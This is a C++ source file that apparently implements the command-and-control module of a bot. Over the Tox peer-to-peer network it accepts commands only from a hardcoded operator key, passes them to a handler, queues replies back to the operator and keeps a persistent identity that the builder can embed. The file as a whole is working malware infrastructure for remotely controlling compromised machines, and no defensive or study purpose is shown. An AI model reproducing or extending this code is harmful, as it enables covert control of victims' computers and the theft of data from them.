#include "../include/tox_c2.h"
#include "../include/tox_bootstrap.h"

#include <tox/tox.h>

#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <deque>
#include <mutex>
#include <thread>

#ifdef _WIN32
#include <windows.h>
#endif

namespace ToxC2 {

namespace {

// ------------------------------------------------------- bootstrap nodes ----
// Shared with toxcli in include/tox_bootstrap.h.

constexpr int kPortRangeStart = 33445;
constexpr int kPortRangeEnd   = 34445;
constexpr int kReconnectAfterSec = 30;   // watchdog: re-bootstrap after this long offline
constexpr int kSaveEverySec       = 300;  // persist identity every 5 minutes

// ------------------------------------------------------------- hex utils ----
int hexNibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

// ----------------------------------------------------------------- instance --
struct Instance {
    Config cfg;
    CommandHandler handler;

    Tox* tox = nullptr;
    std::thread thread;

    std::atomic<bool> running{false};
    std::atomic<bool> connected{false};

    uint8_t operatorPk[TOX_PUBLIC_KEY_SIZE] = {0};
    uint32_t operatorFriendNum = UINT32_MAX; // valid once the friend is on the list

    std::string selfAddress; // bot's own 76-hex Tox ID, set once tox_new succeeds

    std::mutex outMutex;
    std::deque<std::string> outQueue;
};

Instance* g_inst = nullptr;
std::mutex g_instMutex;

// ------------------------------------------------------------ file helpers --
std::vector<uint8_t> ReadFile(const std::string& path)
{
    std::vector<uint8_t> out;
    FILE* f = nullptr;
    if (fopen_s(&f, path.c_str(), "rb") != 0 || !f)
        return out;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    if (sz > 0) {
        fseek(f, 0, SEEK_SET);
        out.resize(static_cast<size_t>(sz));
        fread(out.data(), 1, out.size(), f);
    }
    fclose(f);
    return out;
}

bool WriteFileAtomic(const std::string& path, const std::vector<uint8_t>& data)
{
    const std::string tmp = path + ".tmp";
    FILE* f = nullptr;
    if (fopen_s(&f, tmp.c_str(), "wb") != 0 || !f)
        return false;
    const bool wrote = fwrite(data.data(), 1, data.size(), f) == data.size();
    fclose(f);
    if (!wrote) {
        remove(tmp.c_str());
        return false;
    }
#ifdef _WIN32
    // MSVCRT rename() fails when the destination already exists; replace it.
    if (!MoveFileExA(tmp.c_str(), path.c_str(), MOVEFILE_REPLACE_EXISTING)) {
        remove(tmp.c_str());
        return false;
    }
#else
    if (rename(tmp.c_str(), path.c_str()) != 0) {
        remove(tmp.c_str());
        return false;
    }
#endif
    return true;
}

void SaveTox(Instance* inst)
{
    if (inst->cfg.savedataPath.empty() || !inst->tox)
        return;
    const size_t size = tox_get_savedata_size(inst->tox);
    std::vector<uint8_t> data(size);
    tox_get_savedata(inst->tox, data.data());
    WriteFileAtomic(inst->cfg.savedataPath, data);
}

// -------------------------------------------------------------- callbacks --
void onSelfConnectionStatus(Tox* /*tox*/, Tox_Connection status, void* userData)
{
    auto* inst = static_cast<Instance*>(userData);
    inst->connected.store(status != TOX_CONNECTION_NONE);
#ifdef ENABLE_DEBUG_CONSOLE
    std::fprintf(stdout, "[DBG] Self connection status: %d\n", (int)status);
#endif
}

void onFriendConnectionStatus(Tox* /*tox*/, uint32_t friendNum, Tox_Connection status, void* userData)
{
    auto* inst = static_cast<Instance*>(userData);
#ifdef ENABLE_DEBUG_CONSOLE
    std::fprintf(stdout, "[DBG] Friend %u connection status: %d (peer online=%d)\n",
                 friendNum, (int)status, (int)inst->connected.load());
#endif
    if (friendNum == inst->operatorFriendNum && inst->connected.load()) {
        // The operator is back online; nothing stateful to do, but the hook is
        // here so a heartbeat can be added without touching the loop.
    }
}

void onFriendRequest(Tox* /*tox*/, const Tox_Public_Key /*pubkey*/,
                     const uint8_t* /*message*/, size_t /*length*/, void* /*userData*/)
{
    // Ignore: only the operator (added via add_norequest) may talk to the bot.
}

void onFriendMessage(Tox* tox, uint32_t friendNum, Tox_Message_Type type,
                     const uint8_t* message, size_t length, void* userData)
{
    auto* inst = static_cast<Instance*>(userData);
    // Guard against handler throwing through C toxcore (would terminate)
    auto safeHandler = [&](const std::string& c) -> std::string {
        try { return inst->handler(c); } catch (...) { return std::string(); }
    };
#ifdef ENABLE_DEBUG_CONSOLE
    std::fprintf(stdout, "[DBG] Friend message: type=%d len=%u friend=%u\n",
                 (int)type, (unsigned)length, friendNum);
    if (length > 0) {
        const size_t n = length < 96 ? length : 96;
        std::string head(reinterpret_cast<const char*>(message), n);
        std::fprintf(stdout, "[DBG]   msg head: %.*s\n", (int)n, head.c_str());
    }
#endif
    if (type != TOX_MESSAGE_TYPE_NORMAL)
        return;

    // Authenticate: only the operator's public key is accepted, regardless of
    // friend number (which may shift after loading savedata).
    Tox_Public_Key pk;
    Tox_Err_Friend_Get_Public_Key err;
    if (!tox_friend_get_public_key(tox, friendNum, pk, &err)
        || err != TOX_ERR_FRIEND_GET_PUBLIC_KEY_OK) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::fprintf(stdout, "[DBG]   Cannot resolve friend public key (err=%d), dropping message\n", (int)err);
#endif
        return;
    }
    if (memcmp(pk, inst->operatorPk, TOX_PUBLIC_KEY_SIZE) != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::fprintf(stdout, "[DBG]   Public key does NOT match operator, dropping message\n");
#endif
        return;
    }
#ifdef ENABLE_DEBUG_CONSOLE
    std::fprintf(stdout, "[DBG]   Operator authenticated, dispatching to handler\n");
#endif

    const std::string cmd(reinterpret_cast<const char*>(message), length);
    if (cmd.empty())
        return;

    const std::string reply = safeHandler(cmd);
    if (!reply.empty()) {
        std::lock_guard<std::mutex> lk(inst->outMutex);
        // Bound queue to 32 to avoid OOM spam while offline
        if (inst->outQueue.size() < 32)
            inst->outQueue.push_back(reply);
    }
}

// ---------------------------------------------------------------- thread ---
void ThreadMain(Instance* inst)
{
    // 1. Build options (load savedata for a persistent identity).
    Tox_Options* options = tox_options_new(nullptr);
    tox_options_set_start_port(options, kPortRangeStart);
    tox_options_set_end_port(options, kPortRangeEnd);

    // A fixed identity can be embedded by the builder; when present it always
    // wins over the on-disk savedata so the bot keeps a known Tox ID.
    std::vector<uint8_t> embedded;
    if (!inst->cfg.embeddedSavedataHex.empty())
        embedded = HexToBytes(inst->cfg.embeddedSavedataHex);

    if (!embedded.empty()) {
        tox_options_set_savedata_type(options, TOX_SAVEDATA_TYPE_TOX_SAVE);
        tox_options_set_savedata_data(options, embedded.data(), embedded.size());
    } else {
        const std::vector<uint8_t> savedata = ReadFile(inst->cfg.savedataPath);
        if (!savedata.empty()) {
            tox_options_set_savedata_type(options, TOX_SAVEDATA_TYPE_TOX_SAVE);
            tox_options_set_savedata_data(options, savedata.data(), savedata.size());
        }
    }

    Tox_Err_New newErr;
    inst->tox = tox_new(options, &newErr);
    tox_options_free(options);

    if (!inst->tox || newErr != TOX_ERR_NEW_OK) {
        inst->running.store(false);
        return;
    }

    {
        Tox_Address addr;
        tox_self_get_address(inst->tox, addr);
        std::string hex = BytesToHex(addr, TOX_ADDRESS_SIZE);
        {
            std::lock_guard<std::mutex> lk(g_instMutex);
            if (g_inst == inst) // still the active instance
                inst->selfAddress = hex;
            else
                inst->selfAddress = hex;
        }
#ifdef ENABLE_DEBUG_CONSOLE
        std::fprintf(stdout, "[DBG] Bot self Tox ID: %.76s\n", hex.c_str());
#endif
    }

    // 2. Nickname.
    if (!inst->cfg.name.empty())
        tox_self_set_name(inst->tox, reinterpret_cast<const uint8_t*>(inst->cfg.name.c_str()),
                          inst->cfg.name.size(), nullptr);

    // 3. Callbacks.
    tox_callback_self_connection_status(inst->tox, onSelfConnectionStatus);
    tox_callback_friend_connection_status(inst->tox, onFriendConnectionStatus);
    tox_callback_friend_request(inst->tox, onFriendRequest);
    tox_callback_friend_message(inst->tox, onFriendMessage);

    // 4. Bootstrap + add the operator as a friend (no handshake needed).
    const auto bootstrap = [inst]() {
        for (const ToxBootstrapNode& n : kToxBootstrapNodes) {
            const std::vector<uint8_t> key = HexToBytes(n.keyHex);
            if (key.size() == TOX_PUBLIC_KEY_SIZE)
                tox_bootstrap(inst->tox, n.ip, n.port, key.data(), nullptr);
        }
    };
    bootstrap();

    // Add the operator. A real friend request must be attempted BEFORE any
    // add_norequest call: once the key is already on the friend list,
    // tox_friend_add returns TOX_ERR_FRIEND_ADD_ALREADY_SENT and sends nothing
    // (per tox.h), which silently broke listen-mode discovery. The request
    // also carries the device hash so Discover can identify this bot even if
    // the request lands before the first hello message.
    Tox_Friend_Number operatorNum = UINT32_MAX;
    Tox_Err_Friend_Add addErr = TOX_ERR_FRIEND_ADD_NULL;
    {
        const std::string hello = inst->cfg.helloMessage.empty()
            ? std::string("hello")
            : inst->cfg.helloMessage;
        std::vector<uint8_t> opAddr;
        if (inst->cfg.operatorId.size() == TOX_ADDRESS_SIZE * 2)
            opAddr = HexToBytes(inst->cfg.operatorId);
        if (opAddr.size() == TOX_ADDRESS_SIZE) {
            Tox_Err_Friend_Add reqErr;
            operatorNum = tox_friend_add(inst->tox, opAddr.data(),
                                         reinterpret_cast<const uint8_t*>(hello.data()),
                                         hello.size(), &reqErr);
            addErr = reqErr;
        }
#ifdef ENABLE_DEBUG_CONSOLE
        std::fprintf(stdout, "[DBG] Oper friend_add err=%d num=%u (haveFullAddr=%d) hello=%s\n",
                     (int)addErr, operatorNum, (int)(opAddr.size()==TOX_ADDRESS_SIZE), hello.c_str());
#endif
    }
    if (operatorNum == UINT32_MAX) {
        // No full address, or the key is already on the list: resolve the
        // existing entry, otherwise add without a request.
        Tox_Err_Friend_By_Public_Key byErr;
        const uint32_t num = tox_friend_by_public_key(inst->tox, inst->operatorPk, &byErr);
        if (byErr == TOX_ERR_FRIEND_BY_PUBLIC_KEY_OK) {
            operatorNum = num;
        } else {
            operatorNum = tox_friend_add_norequest(inst->tox, inst->operatorPk, &addErr);
        }
    }
    inst->operatorFriendNum = operatorNum;
#ifdef ENABLE_DEBUG_CONSOLE
    std::fprintf(stdout, "[DBG] Oper friendNum=%u\n", inst->operatorFriendNum);
#endif

    // 5. Event loop.
    auto lastSave = std::chrono::steady_clock::now();
    auto lastBootstrap = std::chrono::steady_clock::now();
    auto lastConnected = std::chrono::steady_clock::now();

    while (inst->running.load()) {
        tox_iterate(inst->tox, inst);

        // Drain outbound queue — pop only on success, keep on transient failure, drop on TOO_LONG.
        for (;;) {
            std::string line;
            {
                std::lock_guard<std::mutex> lk(inst->outMutex);
                if (inst->outQueue.empty()) break;
                line = inst->outQueue.front();
            }
            if (inst->operatorFriendNum == UINT32_MAX) break; // offline, keep queued
            if (line.size() > TOX_MAX_MESSAGE_LENGTH) {
                std::lock_guard<std::mutex> lk(inst->outMutex);
                if (!inst->outQueue.empty() && inst->outQueue.front() == line) inst->outQueue.pop_front();
                continue;
            }
            Tox_Err_Friend_Send_Message err;
            tox_friend_send_message(inst->tox, inst->operatorFriendNum,
                                    TOX_MESSAGE_TYPE_NORMAL,
                                    reinterpret_cast<const uint8_t*>(line.c_str()),
                                    line.size(), &err);
            if (err == TOX_ERR_FRIEND_SEND_MESSAGE_OK) {
                std::lock_guard<std::mutex> lk(inst->outMutex);
                if (!inst->outQueue.empty() && inst->outQueue.front() == line) inst->outQueue.pop_front();
            } else if (err == TOX_ERR_FRIEND_SEND_MESSAGE_FRIEND_NOT_CONNECTED ||
                       err == TOX_ERR_FRIEND_SEND_MESSAGE_SENDQ) {
                break; // retry next iteration
            } else {
                std::lock_guard<std::mutex> lk(inst->outMutex);
                if (!inst->outQueue.empty() && inst->outQueue.front() == line) inst->outQueue.pop_front();
            }
        }

        const auto now = std::chrono::steady_clock::now();

        // Watchdog: re-bootstrap if offline too long.
        if (inst->connected.load())
            lastConnected = now;
        else if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnected).count() >= kReconnectAfterSec
                 && std::chrono::duration_cast<std::chrono::seconds>(now - lastBootstrap).count() >= kReconnectAfterSec) {
            bootstrap();
            lastBootstrap = now;
        }

        // Periodic identity persistence.
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastSave).count() >= kSaveEverySec) {
            SaveTox(inst);
            lastSave = now;
        }

        // Sleep the interval, sliced so Stop() stays responsive.
        uint32_t interval = tox_iteration_interval(inst->tox);
        if (interval == 0)
            interval = 1;
        for (uint32_t slept = 0; slept < interval && inst->running.load(); slept += 10)
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    // 6. Final save + teardown.
    SaveTox(inst);
    tox_kill(inst->tox);
    inst->tox = nullptr;
}

} // namespace

// ------------------------------------------------------------------- API --
std::vector<uint8_t> HexToBytes(const std::string& hex)
{
    if (hex.size() % 2 != 0) return std::vector<uint8_t>();
    std::vector<uint8_t> out;
    out.reserve(hex.size() / 2);
    for (size_t i = 0; i + 1 < hex.size(); i += 2) {
        const int hi = hexNibble(hex[i]);
        const int lo = hexNibble(hex[i + 1]);
        if (hi < 0 || lo < 0)
            return std::vector<uint8_t>();
        out.push_back(static_cast<uint8_t>((hi << 4) | lo));
    }
    return out;
}

std::string BytesToHex(const uint8_t* data, size_t len)
{
    static const char* digits = "0123456789ABCDEF";
    std::string out;
    out.reserve(len * 2);
    for (size_t i = 0; i < len; ++i) {
        out.push_back(digits[data[i] >> 4]);
        out.push_back(digits[data[i] & 0xF]);
    }
    return out;
}

bool Start(const Config& cfg, CommandHandler handler)
{
    if (!handler)
        return false;

    // Operator identity: resolve to a 32-byte public key from whichever field
    // was supplied.
    //   operatorPkHex — 64-char hex public key (preferred, explicit).
    //   operatorId    — 76-char hex Tox address (public key is first 32 bytes)
    //                   OR a 64-char hex public key (same as operatorPkHex).
    std::vector<uint8_t> idBytes;
    if (!cfg.operatorPkHex.empty()) {
        if (cfg.operatorPkHex.size() != TOX_PUBLIC_KEY_SIZE * 2)
            return false;
        idBytes = HexToBytes(cfg.operatorPkHex);
        if (idBytes.size() != TOX_PUBLIC_KEY_SIZE)
            return false;
    } else if (!cfg.operatorId.empty()) {
        const size_t len = cfg.operatorId.size();
        if (len != TOX_PUBLIC_KEY_SIZE * 2 && len != TOX_ADDRESS_SIZE * 2)
            return false;
        idBytes = HexToBytes(cfg.operatorId);
        // For a full address (38 bytes) the PK occupies the first 32; for a
        // bare PK (32 bytes) it is the whole thing. Both cases are handled by
        // the memcpy below which always copies exactly TOX_PUBLIC_KEY_SIZE bytes.
        if (idBytes.size() < TOX_PUBLIC_KEY_SIZE)
            return false;
    } else {
        return false; // no operator identity supplied
    }

    std::lock_guard<std::mutex> lk(g_instMutex);
    if (g_inst) {
        if (g_inst->running.load()) return false; // already running
        // Prior instance failed to start (running=false) but still joinable — reclaim.
        if (g_inst->thread.joinable()) {
            // Unlock to avoid deadlock with ThreadMain's g_instMutex use, then re-lock.
            auto* old = g_inst;
            g_inst = nullptr;
            lk.~lock_guard();
            if (old->thread.joinable()) old->thread.join();
            delete old;
            new (&lk) std::lock_guard<std::mutex>(g_instMutex);
        } else {
            delete g_inst;
            g_inst = nullptr;
        }
    }
    auto* inst = new Instance;
    inst->cfg = cfg;
    inst->handler = std::move(handler);
    memcpy(inst->operatorPk, idBytes.data(), TOX_PUBLIC_KEY_SIZE);
    inst->running.store(true);
    g_inst = inst;
    try {
        inst->thread = std::thread(ThreadMain, inst);
    } catch (...) {
        g_inst = nullptr;
        delete inst;
        return false;
    }
    return true;
}

void Stop()
{
    Instance* inst = nullptr;
    {
        std::lock_guard<std::mutex> lk(g_instMutex);
        if (!g_inst) return;
        inst = g_inst;
        g_inst = nullptr;
        inst->running.store(false);
    }
    if (inst->thread.joinable()) {
        if (inst->thread.get_id() == std::this_thread::get_id()) {
            inst->thread.detach(); // called from Tox thread (handler) — cannot join self
        } else {
            inst->thread.join();
        }
    }
    delete inst;
}

bool IsRunning()
{
    std::lock_guard<std::mutex> lk(g_instMutex);
    return g_inst && g_inst->running.load();
}

bool IsConnected()
{
    std::lock_guard<std::mutex> lk(g_instMutex);
    return g_inst && g_inst->connected.load();
}

std::string GetSelfAddress()
{
    std::lock_guard<std::mutex> lk(g_instMutex);
    return g_inst ? g_inst->selfAddress : std::string();
}

bool SendToOperator(const std::string& message)
{
    std::lock_guard<std::mutex> lk(g_instMutex);
    if (!g_inst || !g_inst->running.load() || message.empty() || message.size() > TOX_MAX_MESSAGE_LENGTH)
        return false;
    {
        std::lock_guard<std::mutex> ql(g_inst->outMutex);
        if (g_inst->outQueue.size() >= 32) return false;
        g_inst->outQueue.push_back(message);
    }
    return true;
}

} // namespace ToxC2
